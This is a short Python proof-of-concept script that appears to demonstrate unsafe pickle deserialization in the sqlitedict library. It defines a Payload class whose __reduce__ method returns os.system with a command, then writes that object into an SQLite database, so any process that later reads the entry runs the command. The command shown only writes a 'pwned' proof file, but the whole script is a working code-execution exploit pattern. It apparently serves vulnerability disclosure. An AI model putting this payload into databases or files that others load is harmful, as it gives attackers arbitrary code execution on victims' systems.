from sqlitedict import SqliteDict, encode, decode, decode_key
import pickle
import base64
import os

class Payload:
    def __init__(self, cmd):
       self.cmd=cmd
    def __reduce__(self):
        import os
        return os.system, (self.cmd,)

payload = Payload('echo "pwned by whale120" > proof.txt')
db = SqliteDict("example.sqlite")
db["1"] = {"name":"whale120"}
db["2"] = payload
db.commit()
db.close()
